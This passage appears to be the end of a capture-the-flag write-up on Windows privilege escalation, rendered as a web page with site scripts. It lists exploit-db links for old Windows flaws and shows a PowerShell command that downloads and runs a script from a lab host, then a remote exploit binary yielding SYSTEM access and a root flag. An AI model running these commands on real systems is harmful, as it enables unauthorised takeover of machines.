+<span id="cb12-100"><a href="#cb12-100" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   http://www.exploit-db.com/exploits/35230/ <span class="at">--</span> Internet Explorer <span class="op">&lt;</span> 11 <span class="at">-</span> OLE Automation Array Remote Code Execution <span class="er">(</span><span class="ex">MSF</span><span class="kw">)</span><span class="ex">,</span> MSF</span>
+<span id="cb12-101"><a href="#cb12-101" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   http://www.exploit-db.com/exploits/35235/ <span class="at">--</span> MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF</span>
+<span id="cb12-102"><a href="#cb12-102" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   http://www.exploit-db.com/exploits/35236/ <span class="at">--</span> MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF</span>
+<span id="cb12-103"><a href="#cb12-103" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-104"><a href="#cb12-104" aria-hidden="true" tabindex="-1"></a><span class="ex">[M]</span> MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution <span class="er">(</span><span class="ex">3000869</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-105"><a href="#cb12-105" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   http://www.exploit-db.com/exploits/35055/ <span class="at">--</span> Windows OLE <span class="at">-</span> Remote Code Execution <span class="st">'Sandworm'</span> Exploit <span class="er">(</span><span class="ex">MS14-060</span><span class="kw">)</span><span class="ex">,</span> PoC</span>
+<span id="cb12-106"><a href="#cb12-106" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   http://www.exploit-db.com/exploits/35020/ <span class="at">--</span> MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF</span>
+<span id="cb12-107"><a href="#cb12-107" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-108"><a href="#cb12-108" aria-hidden="true" tabindex="-1"></a><span class="ex">[M]</span> MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution <span class="er">(</span><span class="ex">3000061</span><span class="kw">)</span> <span class="ex">-</span> Critical</span>
+<span id="cb12-109"><a href="#cb12-109" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span>   http://www.exploit-db.com/exploits/35101/ <span class="at">--</span> Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF</span>
+<span id="cb12-110"><a href="#cb12-110" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span></span>
+<span id="cb12-111"><a href="#cb12-111" aria-hidden="true" tabindex="-1"></a><span class="ex">[E]</span> MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span class="er">(</span><span class="ex">2880430</span><span class="kw">)</span> <span class="ex">-</span> Important</span>
+<span id="cb12-112"><a href="#cb12-112" aria-hidden="true" tabindex="-1"></a><span class="ex">[M]</span> MS13-090: Cumulative Security Update of ActiveX Kill Bits <span class="er">(</span><span class="ex">2900986</span><span class="kw">)</span> <span class="ex">-</span> Critical</span>
+<span id="cb12-113"><a href="#cb12-113" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> done</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Starting to test exploits from the top;</p>
+</section>
+<section id="ms16-135" class="level3">
+<h3 class="anchored" data-anchor-id="ms16-135">MS16-135:</h3>
+<div class="sourceCode" id="cb13"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Users\kostas\Desktop</span><span class="op">&gt;</span> powershell.exe IEX<span class="er">(</span><span class="ex">New-Object</span> Net.Webclient<span class="kw">)</span><span class="ex">.downloadString</span><span class="er">(</span><span class="st">'http://10.10.14.8/MS16-135.ps1'</span><span class="kw">)</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>      <span class="ex">_____</span> _____ ___   ___     ___   ___ ___</span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">|</span>     <span class="kw">|</span>   <span class="ex">__</span><span class="kw">|</span><span class="ex">_</span>  <span class="kw">|</span> <span class="kw">|</span>  <span class="ex">_</span><span class="kw">|</span><span class="ex">___</span><span class="kw">|</span><span class="ex">_</span>  <span class="kw">|</span> <span class="kw">|</span><span class="ex">_</span>  <span class="kw">|</span>  <span class="ex">_</span><span class="kw">|</span></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">|</span> <span class="kw">|</span> <span class="kw">|</span> <span class="kw">|</span><span class="ex">__</span>   <span class="kw">|</span><span class="ex">_</span><span class="kw">|</span> <span class="kw">|</span><span class="ex">_</span><span class="kw">|</span> <span class="bu">.</span> <span class="kw">|</span><span class="ex">___</span><span class="kw">|</span><span class="ex">_</span><span class="kw">|</span> <span class="kw">|</span><span class="ex">_</span><span class="kw">|</span><span class="ex">_</span>  <span class="kw">|</span><span class="ex">_</span>  <span class="kw">|</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">|</span><span class="ex">_</span><span class="kw">|</span><span class="ex">_</span><span class="kw">|</span><span class="ex">_</span><span class="kw">|</span><span class="ex">_____</span><span class="kw">|</span><span class="ex">_____</span><span class="kw">|</span><span class="ex">___</span><span class="kw">|</span>   <span class="kw">|</span><span class="ex">_____</span><span class="kw">|</span><span class="ex">___</span><span class="kw">|</span><span class="ex">___</span><span class="kw">|</span></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>                        <span class="ex">[by</span> b33f <span class="at">-</span><span class="op">&gt;</span> @FuzzySec]</span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>  <span class="ex">[!]</span> Target architecture is x64 only!</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="ms16-098" class="level3">
+<h3 class="anchored" data-anchor-id="ms16-098">MS16-098:</h3>
+<div class="sourceCode" id="cb14"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Users\kostas\Desktop</span><span class="op">&gt;</span> //10.10.14.8/pub-share/ms16-098.exe</span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a>  <span class="ex">Microsoft</span> Windows [Version 6.3.9600]</span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">(</span><span class="ex">c</span><span class="kw">)</span> <span class="ex">2013</span> Microsoft Corporation. All rights reserved.</span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Users\kostas\Desktop</span><span class="op">&gt;</span> whoami</span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>  <span class="ex">nt</span> authority<span class="dt">\s</span>ystem</span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a><span class="ex">C:\Users\kostas\Desktop</span><span class="op">&gt;</span> type C:<span class="dt">\U</span>sers<span class="dt">\A</span>dministrator<span class="dt">\D</span>esktop<span class="dt">\r</span>oot.txt</span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a>  <span class="ex">51ed1b36553c8461f4552c2e92b3eeed</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+
+
+</section>
+</section>
+</section>
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+window.document.addEventListener("DOMContentLoaded", function (event) {
+  const toggleBodyColorMode = (bsSheetEl) => {
+    const mode = bsSheetEl.getAttribute("data-mode");
+    const bodyEl = window.document.querySelector("body");
+    if (mode === "dark") {
+      bodyEl.classList.add("quarto-dark");
+      bodyEl.classList.remove("quarto-light");
+    } else {
+      bodyEl.classList.add("quarto-light");
+      bodyEl.classList.remove("quarto-dark");
+    }
+  }
+  const toggleBodyColorPrimary = () => {
+    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
+    if (bsSheetEl) {
+      toggleBodyColorMode(bsSheetEl);
+    }
+  }
+  toggleBodyColorPrimary();  
+  const icon = "";
+  const anchorJS = new window.AnchorJS();
+  anchorJS.options = {
+    placement: 'right',
+    icon: icon
+  };
+  anchorJS.add('.anchored');
+  const isCodeAnnotation = (el) => {
+    for (const clz of el.classList) {
+      if (clz.startsWith('code-annotation-')) {                     
+        return true;
+      }
+    }
+    return false;
+  }
+  const onCopySuccess = function(e) {
+    // button target
+    const button = e.trigger;
+    // don't keep focus
+    button.blur();
+    // flash "checked"
+    button.classList.add('code-copy-button-checked');
+    var currentTitle = button.getAttribute("title");
+    button.setAttribute("title", "Copied!");
+    let tooltip;
+    if (window.bootstrap) {
+      button.setAttribute("data-bs-toggle", "tooltip");
+      button.setAttribute("data-bs-placement", "left");
+      button.setAttribute("data-bs-title", "Copied!");
+      tooltip = new bootstrap.Tooltip(button, 
+        { trigger: "manual", 
+          customClass: "code-copy-button-tooltip",
+          offset: [0, -8]});
+      tooltip.show();    
+    }
+    setTimeout(function() {
+      if (tooltip) {
+        tooltip.hide();
+        button.removeAttribute("data-bs-title");
+        button.removeAttribute("data-bs-toggle");
+        button.removeAttribute("data-bs-placement");
+      }
+      button.setAttribute("title", currentTitle);
+      button.classList.remove('code-copy-button-checked');
+    }, 1000);
+    // clear code selection
+    e.clearSelection();
+  }
+  const getTextToCopy = function(trigger) {
+      const codeEl = trigger.previousElementSibling.cloneNode(true);
+      for (const childEl of codeEl.children) {
+        if (isCodeAnnotation(childEl)) {
+          childEl.remove();
+        }
+      }
+      return codeEl.innerText;
+  }
+  const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+    text: getTextToCopy
+  });
+  clipboard.on('success', onCopySuccess);
+  if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+    // For code content inside modals, clipBoardJS needs to be initialized with a container option
+    // TODO: Check when it could be a function (https://github.com/zenorocha/clipboard.js/issues/860)
+    const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+      text: getTextToCopy,
+      container: window.document.getElementById('quarto-embedded-source-code-modal')
+    });
+    clipboardModal.on('success', onCopySuccess);
+  }
+    var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+    var mailtoRegex = new RegExp(/^mailto:/);
+      var filterRegex = new RegExp("https:\/\/exploit\.se");
+    var isInternal = (href) => {
+        return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+    }
+    // Inspect non-navigation links and adorn them if external
+ 	var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+    for (var i=0; i<links.length; i++) {
+      const link = links[i];
+      if (!isInternal(link.href)) {
+        // undo the damage that might have been done by quarto-nav.js in the case of
+        // links that we want to consider external
+        if (link.dataset.originalHref !== undefined) {
+          link.href = link.dataset.originalHref;
+        }
+      }
+    }
+  function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+    const config = {
+      allowHTML: true,
+      maxWidth: 500,
+      delay: 100,
+      arrow: false,
+      appendTo: function(el) {
+          return el.parentElement;
+      },
+      interactive: true,
+      interactiveBorder: 10,
+      theme: 'quarto',
+      placement: 'bottom-start',
+    };
+    if (contentFn) {
+      config.content = contentFn;
+    }
+    if (onTriggerFn) {
+      config.onTrigger = onTriggerFn;
+    }
+    if (onUntriggerFn) {
+      config.onUntrigger = onUntriggerFn;
+    }
+    window.tippy(el, config); 
+  }
+  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+  for (var i=0; i<noterefs.length; i++) {
+    const ref = noterefs[i];
+    tippyHover(ref, function() {
+      // use id or data attribute instead here
+      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+      try { href = new URL(href).hash; } catch {}
+      const id = href.replace(/^#\/?/, "");
+      const note = window.document.getElementById(id);
+      if (note) {
+        return note.innerHTML;
+      } else {
+        return "";
+      }
+    });
+  }
+  const xrefs = window.document.querySelectorAll('a.quarto-xref');
+  const processXRef = (id, note) => {
+    // Strip column container classes
+    const stripColumnClz = (el) => {
+      el.classList.remove("page-full", "page-columns");
+      if (el.children) {
+        for (const child of el.children) {
+          stripColumnClz(child);
+        }
+      }
+    }
+    stripColumnClz(note)
+    if (id === null || id.startsWith('sec-')) {
+      // Special case sections, only their first couple elements
+      const container = document.createElement("div");
+      if (note.children && note.children.length > 2) {
+        container.appendChild(note.children[0].cloneNode(true));
+        for (let i = 1; i < note.children.length; i++) {
+          const child = note.children[i];
+          if (child.tagName === "P" && child.innerText === "") {
+            continue;
+          } else {
+            container.appendChild(child.cloneNode(true));
+            break;
+          }
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(container);
+        }
+        return container.innerHTML
+      } else {
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        return note.innerHTML;
+      }
+    } else {
+      // Remove any anchor links if they are present
+      const anchorLink = note.querySelector('a.anchorjs-link');
+      if (anchorLink) {
+        anchorLink.remove();
+      }
+      if (window.Quarto?.typesetMath) {
+        window.Quarto.typesetMath(note);
+      }
+      // TODO in 1.5, we should make sure this works without a callout special case
+      if (note.classList.contains("callout")) {
+        return note.outerHTML;
+      } else {
+        return note.innerHTML;
+      }
+    }
+  }
+  for (var i=0; i<xrefs.length; i++) {
+    const xref = xrefs[i];
+    tippyHover(xref, undefined, function(instance) {
+      instance.disable();
+      let url = xref.getAttribute('href');
+      let hash = undefined; 
+      if (url.startsWith('#')) {
+        hash = url;
+      } else {
+        try { hash = new URL(url).hash; } catch {}
+      }
+      if (hash) {
+        const id = hash.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note !== null) {
+          try {
+            const html = processXRef(id, note.cloneNode(true));
+            instance.setContent(html);
+          } finally {
+            instance.enable();
+            instance.show();
+          }
+        } else {
+          // See if we can fetch this
+          fetch(url.split('#')[0])
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.getElementById(id);
+            if (note !== null) {
+              const html = processXRef(id, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      } else {
+        // See if we can fetch a full url (with no hash to target)
+        // This is a special case and we should probably do some content thinning / targeting
+        fetch(url)
+        .then(res => res.text())
+        .then(html => {
+          const parser = new DOMParser();
+          const htmlDoc = parser.parseFromString(html, "text/html");
+          const note = htmlDoc.querySelector('main.content');
+          if (note !== null) {
+            // This should only happen for chapter cross references
+            // (since there is no id in the URL)
+            // remove the first header
+            if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+              note.children[0].remove();
+            }
+            const html = processXRef(null, note);
+            instance.setContent(html);
+          } 
+        }).finally(() => {
+          instance.enable();
+          instance.show();
+        });
+      }
+    }, function(instance) {
+    });
+  }
+      let selectedAnnoteEl;
+      const selectorForAnnotation = ( cell, annotation) => {
+        let cellAttr = 'data-code-cell="' + cell + '"';
+        let lineAttr = 'data-code-annotation="' +  annotation + '"';
+        const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+        return selector;
+      }
+      const selectCodeLines = (annoteEl) => {
+        const doc = window.document;
+        const targetCell = annoteEl.getAttribute("data-target-cell");
+        const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+        const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+        const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+        const lineIds = lines.map((line) => {
+          return targetCell + "-" + line;
+        })
+        let top = null;
+        let height = null;
+        let parent = null;
+        if (lineIds.length > 0) {
+            //compute the position of the single el (top and bottom and make a div)
+            const el = window.document.getElementById(lineIds[0]);
+            top = el.offsetTop;
+            height = el.offsetHeight;
+            parent = el.parentElement.parentElement;
+          if (lineIds.length > 1) {
+            const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+            const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+            height = bottom - top;
+          }
+          if (top !== null && height !== null && parent !== null) {
+            // cook up a div (if necessary) and position it 
+            let div = window.document.getElementById("code-annotation-line-highlight");
+            if (div === null) {
+              div = window.document.createElement("div");
+              div.setAttribute("id", "code-annotation-line-highlight");
+              div.style.position = 'absolute';
+              parent.appendChild(div);
+            }
+            div.style.top = top - 2 + "px";
+            div.style.height = height + 4 + "px";
+            div.style.left = 0;
+            let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+            if (gutterDiv === null) {
+              gutterDiv = window.document.createElement("div");
+              gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+              gutterDiv.style.position = 'absolute';
+              const codeCell = window.document.getElementById(targetCell);
+              const gutter = codeCell.querySelector('.code-annotation-gutter');
+              gutter.appendChild(gutterDiv);
+            }
+            gutterDiv.style.top = top - 2 + "px";
+            gutterDiv.style.height = height + 4 + "px";
+          }
+          selectedAnnoteEl = annoteEl;
+        }
+      };
+      const unselectCodeLines = () => {
+        const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+        elementsIds.forEach((elId) => {
+          const div = window.document.getElementById(elId);
+          if (div) {
+            div.remove();
+          }
+        });
+        selectedAnnoteEl = undefined;
+      };
+        // Handle positioning of the toggle
+    window.addEventListener(
+      "resize",
+      throttle(() => {
+        elRect = undefined;
+        if (selectedAnnoteEl) {
+          selectCodeLines(selectedAnnoteEl);
+        }
+      }, 10)
+    );
+    function throttle(fn, ms) {
+    let throttle = false;
+    let timer;
+      return (...args) => {
+        if(!throttle) { // first call gets through
+            fn.apply(this, args);
+            throttle = true;
+        } else { // all the others get throttled
+            if(timer) clearTimeout(timer); // cancel #2
+            timer = setTimeout(() => {
+              fn.apply(this, args);
+              timer = throttle = false;
+            }, ms);
+        }
+      };
+    }
+      // Attach click handler to the DT
+      const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+      for (const annoteDlNode of annoteDls) {
+        annoteDlNode.addEventListener('click', (event) => {
+          const clickedEl = event.target;
+          if (clickedEl !== selectedAnnoteEl) {
+            unselectCodeLines();
+            const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+            if (activeEl) {
+              activeEl.classList.remove('code-annotation-active');
+            }
+            selectCodeLines(clickedEl);
+            clickedEl.classList.add('code-annotation-active');
+          } else {
+            // Unselect the line
+            unselectCodeLines();
+            clickedEl.classList.remove('code-annotation-active');
+          }
+        });
+      }
+  const findCites = (el) => {
+    const parentEl = el.parentElement;
+    if (parentEl) {
+      const cites = parentEl.dataset.cites;
+      if (cites) {
+        return {
+          el,
+          cites: cites.split(' ')
+        };
+      } else {
+        return findCites(el.parentElement)
+      }
+    } else {
+      return undefined;
+    }
+  };
+  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+  for (var i=0; i<bibliorefs.length; i++) {
+    const ref = bibliorefs[i];
+    const citeInfo = findCites(ref);
+    if (citeInfo) {
+      tippyHover(citeInfo.el, function() {
+        var popup = window.document.createElement('div');
+        citeInfo.cites.forEach(function(cite) {
+          var citeDiv = window.document.createElement('div');
+          citeDiv.classList.add('hanging-indent');
+          citeDiv.classList.add('csl-entry');
+          var biblioDiv = window.document.getElementById('ref-' + cite);
+          if (biblioDiv) {
+            citeDiv.innerHTML = biblioDiv.innerHTML;
+          }
+          popup.appendChild(citeDiv);
+        });
+        return popup.innerHTML;
+      });
+    }
+  }
+});
+</script>
+</div> <!-- /content -->
+
+
+
+
+</body></html>
